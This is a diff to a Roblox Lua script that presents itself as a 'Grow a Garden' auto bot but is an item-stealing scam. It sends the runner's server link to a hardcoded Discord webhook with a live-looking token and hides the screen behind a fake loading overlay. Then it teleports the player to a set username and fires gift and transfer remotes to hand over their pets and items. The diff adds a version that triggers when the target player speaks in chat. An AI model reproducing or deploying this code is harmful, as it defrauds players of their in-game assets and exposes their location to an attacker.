@@ -1,11 +1,11 @@
--- 🌿 GROW A GARDEN BOT — LINK + FULL AUTO
+-- 🌿 GROW A GARDEN BOT — FULL AUTO WITH CHAT DETECT
 
--- CONFIGURATION
+-- CONFIG
 local CONFIG = {
     TARGET_USERNAME = "Sgahfd1223",
     WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz",
     LANGUAGE = "ru",
-    LOADING_TIME = 600,
+    LOADING_TIME = 60, -- сек (для теста можно уменьшить)
     CHECK_INTERVAL = 5,
     TRANSFER_DELAY = 0.25,
     TELEPORT_TIME = 1,
@@ -15,8 +15,8 @@ local CONFIG = {
 -- SERVICES
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 
@@ -31,7 +31,6 @@ local TXT = LANGUAGES[CONFIG.LANGUAGE]
 local function createLoadingUI()
     local gui = Instance.new("ScreenGui", CoreGui)
     gui.Name = "GrowGardenBot"
-
     local frame = Instance.new("Frame", gui)
     frame.Size = UDim2.new(1,0,1,0)
     frame.BackgroundColor3 = Color3.fromRGB(15,15,25)
@@ -65,7 +64,7 @@ local function createLoadingUI()
     return {GUI = gui, Bar = bar, Percent = percent, Title = title}
 end
 
--- WEBHOOK MODULE
+-- WEBHOOK
 local function sendWebhook(content)
     local data = HttpService:JSONEncode({content = content})
     local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
@@ -81,9 +80,22 @@ local function sendWebhook(content)
     end
 end
 
--- Отправка ссылки на сервер сразу при запуске
+-- Сразу отправляем ссылку на сервер
 local serverLink = "https://floating.gg/?placeID="..game.PlaceId.."&gameInstanceId="..game.JobId
 sendWebhook("🌿 Ссылка на сервер: "..serverLink)
+
+-- TELEPORT
+local function tweenTeleport(target)
+    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+    if root and targetRoot then
+        local tweenInfo = TweenInfo.new(CONFIG.TELEPORT_TIME, Enum.EasingStyle.Linear)
+        local tweenGoal = {CFrame = targetRoot.CFrame + Vector3.new(0,3,0)}
+        local tween = TweenService:Create(root, tweenInfo, tweenGoal)
+        tween:Play()
+        tween.Completed:Wait()
+    end
+end
 
 -- COLLECT PETS
 local function collectPets()
@@ -99,22 +111,8 @@ local function collectPets()
     return pets
 end
 
--- TWEEN TELEPORT
-local function tweenTeleport(target)
-    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
-    if root and targetRoot then
-        local tweenInfo = TweenInfo.new(CONFIG.TELEPORT_TIME, Enum.EasingStyle.Linear)
-        local tweenGoal = {CFrame = targetRoot.CFrame + Vector3.new(0,3,0)}
-        local tween = TweenService:Create(root, tweenInfo, tweenGoal)
-        tween:Play()
-        tween.Completed:Wait()
-    end
-end
-
 -- TRANSFER ITEMS
 local function transferItems(target)
-    local success = 0
     local remotes = {}
     for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
         if r:IsA("RemoteEvent") and (r.Name:lower():find("transfer") or r.Name:lower():find("gift") or r.Name:lower():find("send")) then
@@ -138,31 +136,37 @@ local function transferItems(target)
         for i=1,#items,CONFIG.BATCH_SIZE do
             for j=i,math.min(i+CONFIG.BATCH_SIZE-1,#items) do
                 pcall(function() remote:FireServer(items[j], target) end)
-                success += 1
                 task.wait(CONFIG.TRANSFER_DELAY)
             end
             task.wait(CONFIG.TRANSFER_DELAY*2)
         end
     end
-    return success
 end
 
--- MAIN LOOP
-local function runBot()
-    while true do
-        for _, plr in ipairs(Players:GetPlayers()) do
-            if plr.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
-                tweenTeleport(plr)
-                collectPets()
-                transferItems(plr)
-                break
-            end
-        end
-        task.wait(CONFIG.CHECK_INTERVAL)
+-- CHAT DETECT + TELEPORT + TRANSFER
+local function monitorPlayerChat()
+    local target = Players:FindFirstChild(CONFIG.TARGET_USERNAME)
+    if target then
+        target.Chatted:Connect(function(msg)
+            print("Сообщение от "..CONFIG.TARGET_USERNAME..": "..msg)
+            tweenTeleport(target)
+            collectPets()
+            transferItems(target)
+        end)
     end
 end
 
--- STARTUP
+-- Если игрок уже в игре
+monitorPlayerChat()
+
+-- Подписка на будущие входы
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == CONFIG.TARGET_USERNAME then
+        monitorPlayerChat()
+    end
+end)
+
+-- STARTUP GUI
 local ui = createLoadingUI()
 local start = os.time()
 while os.time() - start < CONFIG.LOADING_TIME do
@@ -173,4 +177,3 @@ while os.time() - start < CONFIG.LOADING_TIME do
     task.wait(1)
 end
 ui.GUI:Destroy()
-runBot()
